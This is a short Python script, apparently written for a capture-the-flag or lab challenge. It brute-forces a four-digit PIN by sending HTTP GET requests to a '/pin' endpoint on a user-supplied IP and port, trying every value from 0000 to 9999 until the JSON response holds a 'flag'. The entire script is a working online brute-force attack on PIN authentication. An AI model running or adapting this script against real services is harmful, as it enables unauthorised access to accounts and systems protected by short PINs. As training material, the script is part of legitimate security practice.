#!/usr/bin/env python3
import requests

def brute(ip, port):
	# 0~9999
	for num in range(10000):
		formatted_num = f"{num:04d}"
		print(f"Attempted PIN: {formatted_num}")
		response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_num}", timeout=5)
		# status code == 200
		if response.ok and 'flag' in response.json():
			print(f"PIN : {formatted_num}")
			print(f"Flag: {response.json()['flag']}")
			break

if __name__ == '__main__':
	target_ip = input("IP: ")
	target_port = int(input("Port: "))
	brute(target_ip, target_port)